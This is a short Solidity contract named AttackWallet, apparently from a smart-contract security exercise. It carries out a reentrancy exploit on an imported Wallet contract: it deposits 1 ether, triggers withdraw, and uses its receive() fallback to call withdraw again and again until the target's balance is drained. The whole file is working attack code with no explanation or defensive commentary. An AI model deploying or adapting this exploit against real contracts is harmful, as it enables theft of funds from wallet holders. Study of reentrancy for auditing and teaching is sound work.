// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./Wallet.sol";

contract AttackWallet {
  uint constant SUM = 1 ether;
  Wallet targetWallet;

  constructor(address payable _wallet) {
    targetWallet = Wallet(_wallet);
  }

  function depositAttack() public payable {
    targetWallet.deposit{value: SUM}(address(this));
  }

  function attack() external payable {
    targetWallet.withdraw(SUM);
  }

  receive() external payable {
    if(address(targetWallet).balance >= SUM) {
      targetWallet.withdraw(SUM);
    } 
  }
} 

